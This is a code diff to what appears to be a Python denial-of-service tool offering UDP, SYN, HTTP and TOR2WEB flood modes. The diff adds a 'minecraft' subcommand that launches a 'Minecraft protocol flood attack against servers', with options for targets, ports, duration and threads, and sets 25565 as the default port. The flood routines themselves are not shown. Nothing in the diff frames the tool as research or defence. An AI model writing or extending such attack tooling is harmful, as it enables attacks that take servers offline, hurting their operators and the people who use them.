@@ -123,7 +123,8 @@ def get_default_ports(method: str) -> List[int]:
     default_ports = {
         'udp': [53],         # Default DNS port for UDP flood
         'syn': [80, 443],    # Common web ports for SYN flood
-        'http': [80, 443]    # Standard HTTP/HTTPS ports
+        'http': [80, 443],   # Standard HTTP/HTTPS ports
+        'minecraft': [25565]  # Default Minecraft server port
     }
     return default_ports.get(method, [80])  # Default to port 80 if method not found
 
@@ -271,6 +272,20 @@ Supports multiple flooding methods including UDP, SYN, and HTTP attacks.
     tor2web_parser.add_argument('-T', '--threads', type=int, default=5,
                            help='Number of threads per target (default: 5)')
 
+    # Add Minecraft parser
+    minecraft_parser = subparsers.add_parser('minecraft',
+        help='Minecraft server flood operation',
+        description='Launch a Minecraft protocol flood attack against servers',
+        parents=[base_parser])
+    minecraft_parser.add_argument('-t', '--targets', required=True,
+                           help='Target specification (same format as UDP flood)')
+    minecraft_parser.add_argument('-p', '--ports', required=False,
+                           help='Port specification (default: 25565)')
+    minecraft_parser.add_argument('-d', '--duration', type=int, default=60,
+                           help='Duration of the attack in seconds (default: 60)')
+    minecraft_parser.add_argument('-T', '--threads', type=int, default=5,
+                           help='Number of threads per target (default: 5)')
+
     # Parse arguments
     args = parser.parse_args()
     
@@ -401,6 +416,17 @@ Supports multiple flooding methods including UDP, SYN, and HTTP attacks.
                 ports=[80],  # TOR2WEB uses HTTP/HTTPS
                 duration=args.duration,
                 threads=args.threads,
+                skip_prompt=args.yes
+            )
+            active_flooder.start()
+        elif args.command == 'minecraft':
+            from assets.other_methods import MinecraftFlooder
+            active_flooder = MinecraftFlooder(
+                targets=targets,
+                ports=ports if ports else [25565],  # Use 25565 as default
+                duration=args.duration,
+                threads=args.threads,
+                debug=args.verbose,
                 skip_prompt=args.yes
             )
             active_flooder.start()
